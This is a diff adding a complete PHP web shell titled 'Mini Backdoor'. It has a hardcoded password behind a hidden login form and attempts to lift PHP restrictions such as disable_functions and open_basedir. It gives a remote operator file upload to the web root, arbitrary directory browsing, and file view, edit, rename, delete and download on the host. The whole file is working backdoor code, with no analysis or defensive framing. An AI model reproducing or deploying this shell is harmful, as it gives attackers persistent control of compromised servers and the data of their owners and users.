@@ -1,0 +1,674 @@
+<?php
+error_reporting(0);
+session_start();
+set_time_limit(0);
+ignore_user_abort(0);
+ini_set('max_execution_time', 0);
+ini_set('memory_limit', '999999999M');
+ini_set('zlib.output_compression', 'Off');
+ini_restore('safe_mode');
+ini_restore("safe_mode_include_dir");
+ini_restore("safe_mode_exec_dir");
+ini_restore("disable_functions");
+ini_restore("allow_url_fopen");
+ini_restore("open_basedir");
+$password = "MiniBackdoor";
+function home() {
+	$home = "http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."";
+	?> <script type="text/javascript">window.location='<?php print $home ?>';</script> <?php
+}
+if ($_GET['action'] == 'home') {
+	@home();
+}
+function logout() {
+	unset($_SESSION[@md5($_SERVER['HTTP_HOST'])]);
+	@home();
+}
+if ($_GET['action'] == 'logout') {
+	@logout();
+}
+function login() {
+?>
+<style type="text/css">
+	div.login {
+		display:none;
+	} input[type=password] {
+		text-align:center;
+	}
+</style>
+<div class="login">
+	<center>
+	<form method="post">
+       <input type="password" name="password" placeholder="PASSWORD">
+    </form>
+    </center>
+</div>
+<?php
+  exit();
+}
+if (!isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) {
+  if(empty($password) || (isset($_POST['password']) && ($_POST['password']) == $password)) {
+    $_SESSION[md5($_SERVER['HTTP_HOST']) ] = true;
+  } else {
+    login();
+  }
+}
+?>
+<title>Mini Backdoor</title>
+<style type="text/css">
+	body {
+		font-family:Arial;
+		color:#fff;
+		background:#1c1c1c;
+	} textarea {
+		background:transparent;
+		width:100%;
+		height:500px;
+		color:#fff;
+		border:1px solid green;
+	} a {
+		color:#fff;
+		text-decoration:none;
+	} table, tr, td {
+		border-collapse:collapse;
+		border-spacing:0;
+		border:1px solid green;
+	} th {
+		padding:10px;
+		background:green
+	} input[type=text] {
+		color:#fff;
+		border:1px solid green;
+		background:transparent;
+	} input[type=submit], select {
+		font-weight:bold;
+		color:#fff;
+		border:1px solid green;
+		background:green;
+	} input[type=submit]:hover {
+		cursor:pointer;
+		background:darkgreen;
+		border:1px solid darkgreen;
+	} tr.hover:hover {
+		background:darkgreen;
+	} td.header {
+		font-weight:bold;
+		padding:7px;
+	}
+</style>
+<?php
+error_reporting(0);
+define('SEP', '/');
+function cwd() {
+	$cwd = @str_replace('\\', '/', @getcwd());
+	return $cwd;
+}
+?>
+<table align="center" width="100%">
+	<tr>
+		<th colspan="3">MiniBackdoor</th>
+	</tr>
+	<tr>
+		<td class="header">
+			<center>
+				<a href="?action=home">HOME</a>
+			</center>
+		</td>
+		<td class="header">
+			<center>
+				<?php print @tools("upload") ?>
+			</center>
+		</td>
+		<td class="header">
+			<center>
+				<a href="?action=logout">LOGOUT</a>
+			</center>
+		</td>
+	</tr>
+</table>
+<?php
+function perms($file) {
+    $perms = fileperms($file);
+    switch ($perms & 0xF000) {
+    case 0xC000: // socket
+        $info = 's';
+        break;
+    case 0xA000: // symbolic link
+        $info = 'l';
+        break;
+    case 0x8000: // regular
+        $info = 'r';
+        break;
+    case 0x6000: // block special
+        $info = 'b';
+        break;
+    case 0x4000: // directory
+        $info = 'd';
+        break;
+    case 0x2000: // character special
+        $info = 'c';
+        break;
+    case 0x1000: // FIFO pipe
+        $info = 'p';
+        break;
+    default: // unknown
+        $info = 'u';
+}
+// Owner
+$info .= (($perms & 0x0100) ? 'r' : '-');
+$info .= (($perms & 0x0080) ? 'w' : '-');
+$info .= (($perms & 0x0040) ?
+            (($perms & 0x0800) ? 's' : 'x' ) :
+            (($perms & 0x0800) ? 'S' : '-'));
+// Group
+$info .= (($perms & 0x0020) ? 'r' : '-');
+$info .= (($perms & 0x0010) ? 'w' : '-');
+$info .= (($perms & 0x0008) ?
+            (($perms & 0x0400) ? 's' : 'x' ) :
+            (($perms & 0x0400) ? 'S' : '-'));
+// World
+$info .= (($perms & 0x0004) ? 'r' : '-');
+$info .= (($perms & 0x0002) ? 'w' : '-');
+$info .= (($perms & 0x0001) ?
+            (($perms & 0x0200) ? 't' : 'x' ) :
+            (($perms & 0x0200) ? 'T' : '-'));
+return $info;
+}
+function writable($dir, $perms) {
+	if (!is_writable($dir)) {
+		?> <font color="red"><?php print $perms ?></font> <?php
+	} else {
+		?> <font color="green"><?php print $perms ?></font> <?php
+	}
+}
+function alertSuccess($message) {
+?>
+<script type="text/javascript">
+var ALERT_TITLE = "Alert !";
+var ALERT_BUTTON_TEXT = "OK";
+if (document.getElementById) {
+  window.alert = function(txt) {
+    createCustomAlert(txt);
+  }
+}
+function createCustomAlert(txt) {
+  d = document;
+  if (d.getElementById("modalContainer")) return;
+  mObj = d.getElementsByTagName("body")[0].appendChild(d.createElement("div"));
+  mObj.id = "modalContainer";
+  mObj.style.height = d.documentElement.scrollHeight + "px";
+  alertObj = mObj.appendChild(d.createElement("div"));
+  alertObj.id = "alertBox";
+  if (d.all && !window.opera) alertObj.style.top = document.documentElement.scrollTop + "px";
+  alertObj.style.left = (d.documentElement.scrollWidth - alertObj.offsetWidth) / 2 + "px";
+  alertObj.style.visiblity = "visible";
+  h1 = alertObj.appendChild(d.createElement("h1"));
+  h1.appendChild(d.createTextNode(ALERT_TITLE));
+  msg = alertObj.appendChild(d.createElement("p"));
+  msg.appendChild(d.createTextNode(txt));
+  msg.innerHTML = txt;
+  btn = alertObj.appendChild(d.createElement("a"));
+  btn.id = "closeBtn";
+  btn.appendChild(d.createTextNode(ALERT_BUTTON_TEXT));
+  btn.href = "#";
+  btn.focus();
+  btn.onclick = function() { removeCustomAlert(); return false; }
+  alertObj.style.display = "block";
+}
+
+function removeCustomAlert() {
+  document.getElementsByTagName("body")[0].removeChild(document.getElementById("modalContainer"));
+}
+</script>
+<style type="text/css">
+#modalContainer {
+  background-color: rgba(0, 0, 0, 0.3);
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  top: 0px;
+  left: 0px;
+  z-index: 10000;
+} #alertBox {
+  position: relative;
+  width: 300px;
+  min-height: 100px;
+  margin-top: 50px;
+  background-color: #fff;
+  background-repeat: no-repeat;
+  background-position: 20px 30px;
+} #modalContainer>#alertBox {
+  position: fixed;
+} #alertBox h1 {
+  margin: 0;
+  font: bold 0.9em arial;
+  background-color: green;
+  color: #FFF;
+  padding:7px;
+  border-bottom: 1px solid green;
+} #alertBox p {
+  color: green;
+  text-align:center;
+  height: 50px;
+  padding-left: 5px;
+} #alertBox #closeBtn {
+  display: block;
+  position: relative;
+  margin: 5px auto;
+  padding: 7px;
+  border: 0 none;
+  width: 70px;
+  font: 0.7em arial;
+  text-transform: uppercase;
+  text-align: center;
+  color: #FFF;
+  background-color: green;
+  border-radius: 3px;
+  text-decoration: none;
+} #mContainer {
+  position: relative;
+  width: 600px;
+  margin: auto;
+  padding: 5px;
+  border-top: 2px solid #000;
+  border-bottom: 2px solid #000;
+  font: 0.7em verdana, arial;
+} h1, h2 {
+  margin: 0;
+  padding: 4px;
+  font: bold 1.5em verdana;
+  border-bottom: 1px solid #000;
+} code {
+  font-size: 1.2em;
+  color: #069;
+}
+</style>
+<script type="text/javascript">alert(<?php echo "'" . $message . "'"; ?>);</script>
+<?php
+}
+function alertFailed($message) {
+?>
+<script type="text/javascript">
+var ALERT_TITLE = "Alert";
+var ALERT_BUTTON_TEXT = "OK";
+if (document.getElementById) {
+  window.alert = function(txt) {
+    createCustomAlert(txt);
+  }
+}
+
+function createCustomAlert(txt) {
+  d = document;
+  if (d.getElementById("modalContainer")) return;
+  mObj = d.getElementsByTagName("body")[0].appendChild(d.createElement("div"));
+  mObj.id = "modalContainer";
+  mObj.style.height = d.documentElement.scrollHeight + "px";
+  alertObj = mObj.appendChild(d.createElement("div"));
+  alertObj.id = "alertBox";
+  if (d.all && !window.opera) alertObj.style.top = document.documentElement.scrollTop + "px";
+  alertObj.style.left = (d.documentElement.scrollWidth - alertObj.offsetWidth) / 2 + "px";
+  alertObj.style.visiblity = "visible";
+  h1 = alertObj.appendChild(d.createElement("h1"));
+  h1.appendChild(d.createTextNode(ALERT_TITLE));
+  msg = alertObj.appendChild(d.createElement("p"));
+  //msg.appendChild(d.createTextNode(txt));
+  msg.innerHTML = txt;
+  btn = alertObj.appendChild(d.createElement("a"));
+  btn.id = "closeBtn";
+  btn.appendChild(d.createTextNode(ALERT_BUTTON_TEXT));
+  btn.href = "#";
+  btn.focus();
+  btn.onclick = function() { removeCustomAlert(); return false; }
+  alertObj.style.display = "block";
+}
+
+function removeCustomAlert()
+{
+  document.getElementsByTagName("body")[0].removeChild(document.getElementById("modalContainer"));
+}
+</script>
+<style type="text/css">
+#modalContainer {
+  background-color: rgba(0, 0, 0, 0.3);
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  top: 0px;
+  left: 0px;
+  z-index: 10000;
+  /* required by MSIE to prevent actions on lower z-index elements */
+}
+
+#alertBox {
+  position: relative;
+  width: 300px;
+  min-height: 100px;
+  margin-top: 50px;
+  background-color: #fff;
+  background-repeat: no-repeat;
+  background-position: 20px 30px;
+}
+
+#modalContainer>#alertBox {
+  position: fixed;
+}
+
+#alertBox h1 {
+  margin: 0;
+  font: bold 0.9em arial;
+  background-color: red;
+  color: #FFF;
+  padding:7px;
+  border-bottom: 1px solid red;
+}
+
+#alertBox p {
+  color: red;
+  text-align:center;
+  height: 50px;
+  padding-left: 5px;
+}
+
+#alertBox #closeBtn {
+  display: block;
+  position: relative;
+  margin: 5px auto;
+  padding: 7px;
+  border: 0 none;
+  width: 70px;
+  font: 0.7em arial;
+  text-transform: uppercase;
+  text-align: center;
+  color: #FFF;
+  background-color: red;
+  border-radius: 3px;
+  text-decoration: none;
+}
+
+
+/* unrelated styles */
+
+#mContainer {
+  position: relative;
+  width: 600px;
+  margin: auto;
+  padding: 5px;
+  border-top: 2px solid #000;
+  border-bottom: 2px solid #000;
+  font: 0.7em verdana, arial;
+}
+
+h1,
+h2 {
+  margin: 0;
+  padding: 4px;
+  font: bold 1.5em verdana;
+  border-bottom: 1px solid #000;
+}
+
+code {
+  font-size: 1.2em;
+  color: #069;
+}
+</style>
+<script type="text/javascript">alert(<?php echo "'" . $message . "'"; ?>);</script>
+<?php
+}
+function tools($toolsname = null) {
+if ($toolsname === 'upload') {
+		if (isset($_POST['upload'])) {
+			if ($_POST['type'] == 'biasa') {
+				if (@copy($_FILES['file']['tmp_name'], @cwd().SEP.$_FILES['file']['name'])) {
+					print("Uploaded at => ".@cwd().SEP.$_FILES['file']['name']."");
+				} else {
+					print("Failed");
+				}
+			}
+		} if ($_POST['type'] == 'home_root') {
+			$web  = "http://".$_SERVER['SERVER_NAME']."";
+			$home = $_SERVER['DOCUMENT_ROOT'];
+			if (@copy($_FILES['file']['tmp_name'], $home.SEP.$_FILES['file']['name'])) {
+				print("Uploaded at => <a href='".$web.SEP.$_FILES['file']['name']."' target='_blank'>
+					".$web.SEP.$_FILES['file']['name']."</a>");
+			} else {
+				print("Failed");
+			}
+		}
+		?>
+			<form method="post" enctype="multipart/form-data">
+				<input type="radio" name="type" value="biasa" checked>biasa 
+				[ <?php print @writable(@cwd(), "writable") ?> ]
+				<input type="radio" name="type" value="home_root">home_root
+				[ <?php print @writable($_SERVER['DOCUMENT_ROOT'], "writable") ?> ]<br>
+				<input type="file" name="file">
+				<input type="submit" name="upload" value="UPLOAD">
+			</form>
+		<?php
+	}
+}
+function size($filename) {
+	$size = @filesize($filename)/1024;
+	$size = @round($size, 3);
+	if ($size > 1024) {
+		$size = @round($size/1024,2). ' MiB';
+	} else {
+		$size = $size . ' KiB';
+	} return $size;
+}
+function view($filename) {
+	if (@file_exists($filename)) {
+		$text = @htmlspecialchars(@file_get_contents($filename));
+		?>
+		<center>
+		Filename : <?php print $filename ?><br>
+		<textarea readonly><?php print $text ?></textarea>
+	    </center>
+		<?php
+	}
+}
+if (@$_GET['action'] == 'view' and isset($_GET['file'])) {
+	@view($_GET['file']);
+}
+if ($_POST['do'] == 'edit') {
+	if (isset($_POST['text'])) {
+		$fp = @fopen($_POST['file'], "w");
+		if (@fwrite($fp, $_POST['text'])) {
+			@alertSuccess("Edit Success :)");
+		} else {
+			@alertFailed("Edit Failed :(");
+		}
+	} $text = @htmlspecialchars(@file_get_contents($_POST['file']));
+	?>
+	<center>
+		Filename : <?php print $_POST['file'] ?><br>
+	<form method="post">
+		<textarea name="text"><?php print $text ?></textarea>
+		<input type="hidden" name="file" value="<?php print $_POST['file'] ?>">
+		<input type="hidden" name="do" value="edit"><br><br>
+		<input style="width:100%;" type="submit" value="SAVE">
+	</form>
+    </center>
+	<?php
+} if ($_POST['do'] == 'rename') {
+	if (isset($_POST['rename'])) {
+		if (@rename($_POST['file'], $_POST['rename'])) {
+			@alertSuccess("Rename Success :)");
+		} else {
+			@alertFailed("Rename Failed :(");
+		}
+	}
+	?>
+	<br>
+	<center>
+	<form method="post">
+		Filename : 
+		<input style="width:250px;" type="text" name="rename" value="<?php print $_POST['file'] ?>">
+		<input type="hidden" name="file" value="<?php print $_POST['file'] ?>">
+		<input type="hidden" name="do" value="rename">
+		<input type="submit">
+	</form>
+    </center>
+	<?php
+} if ($_POST['do'] == 'delete') {
+        if ($_POST['type'] == 'dir') {
+            if (@rmdir($_POST['file'])) {
+                @alertSuccess("Delete Success :)");
+            } else {
+                @alertFailed("Delete Failed :(");
+            }
+        }
+        if ($_POST['type'] == 'file') {
+            if (@unlink($_POST['file'])) {
+                @alertSuccess("Delete Success :)");
+            } else {
+                @alertFailed("Delete Failed :(");
+            }
+        }
+    }
+if ($_POST['do'] == 'download') {
+	@ob_clean();
+    $file = $_POST['file'];
+    header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename="'.basename($file).'"');
+    header('Expires: 0');
+    header('Cache-Control: must-revalidate');
+    header('Pragma: public');
+    header('Content-Length: ' . filesize($file));
+    readfile($file);
+    exit;
+}
+if (isset($_GET['dir'])) {
+	@chdir($_GET['dir']);
+}
+if (@$_POST['do'] == 'makefile') {
+	if (isset($_POST['make'])) {
+		if (@touch(@cwd().SEP.@htmlspecialchars($_POST['make']))) {
+			print("Success");
+		} else {
+			print("Failed");
+		}
+	}
+	?>
+	<center><br>
+	<form method="post">
+		Filename : 
+		<input style="width:250px;" type="text" name="make" value="newfile.php">
+		<input type="hidden" name="do" value="makefile">
+		<input type="submit">
+	</form>
+    </center>
+	<?php
+}
+if (@$_POST['do'] == 'makedir') {
+	if (isset($_POST['make'])) {
+		if (@mkdir(@cwd().SEP.@htmlspecialchars($_POST['make']))) {
+			print("Success");
+		} else {
+			print("Failed");
+		}
+	}
+	?>
+	<center><br>
+	<form method="post">
+		Dirname : 
+		<input style="width:250px;" type="text" name="make" value="newdir">
+		<input type="hidden" name="do" value="makedir">
+		<input type="submit">
+	</form>
+    </center>
+	<?php
+}
+?>
+<table width="100%">
+		</th>
+	</tr>
+	<tr>
+		<th>Filename</th>
+		<th>Size</th>
+		<th>Permission</th>
+		<th>Action</th>
+	</tr>
+<?php
+foreach (@scandir(@cwd()) as $dir) {
+	if (!is_dir($dir)) continue;
+	if ($dir === '.' || $dir === '..') {
+		$action = '
+		<center>
+			<form method="post" action="?dir='.@cwd().'">
+				<select name="do">
+					<option value="makefile">Newfile</option>
+					<option value="makedir">Newdir</option>
+				</select>
+				<input type="submit" value="Action">
+			</form>
+		</center>';
+	} else {
+		$action = '
+		<center>
+			<form method="post" action="?dir='.@cwd().'">
+				<select name="do">
+					<option value="rename">Rename</option>
+					<option value="delete">Delete</option>
+				</select>
+				<input type="hidden" name="type" value="dir">
+				<input type="hidden" name="file" value="'.@cwd().SEP.$dir.'">
+				<input type="submit" value="Action">
+			</form>
+		</center>';
+	}
+	?>
+	<tr class="hover"><td> [ D ]. 
+	<a href='?dir=<?php print @cwd().SEP.$dir ?>'><?php print $dir ?></a></td>
+	<td>
+		<center>
+			--
+		</center>
+	</td>
+	<td>
+		<center>
+			<?php print @writable($dir, @perms($dir)) ?>
+		</center>
+	</td>
+	<td>
+		<?php print $action ?>
+	</td>
+	<?php
+}
+foreach (@scandir(@cwd()) as $file) {
+	if (!is_file($file)) continue;
+	?><tr class="hover">
+	<td>[ F ].
+	<a href='?action=view&dir=<?php print @cwd()."&file=".@cwd().SEP.$file ?>'><?php print $file ?></a>
+	</td>
+	<td>
+		<center>
+			<?php print @size($file) ?>
+		</center>
+	</td>
+	<td>
+		<center>
+			<?php print @writable($file, @perms($file)) ?>
+		</center>
+	</td>
+	<td>
+		<center>
+	<form method="post" action="?dir=<?php print @cwd() ?>">
+		<select name="do">
+			<option value="edit">Edit</option>
+			<option value="rename">Rename</option>
+			<option value="delete">Delete</option>
+			<option value="download">Download</option>
+		</select>
+		<input type="hidden" name="type" value="file">
+		<input type="hidden" name="file" value="<?php print @cwd().SEP.$file ?>">
+		<input type="submit" value="Action">
+	</form></center></td>
+	<?php
+}
+?>
+<tr>
+	<th colspan="4">
+		&copy; L0LZ666H05T - <?php print @date("Y") ?>
+	</th>
+</tr>
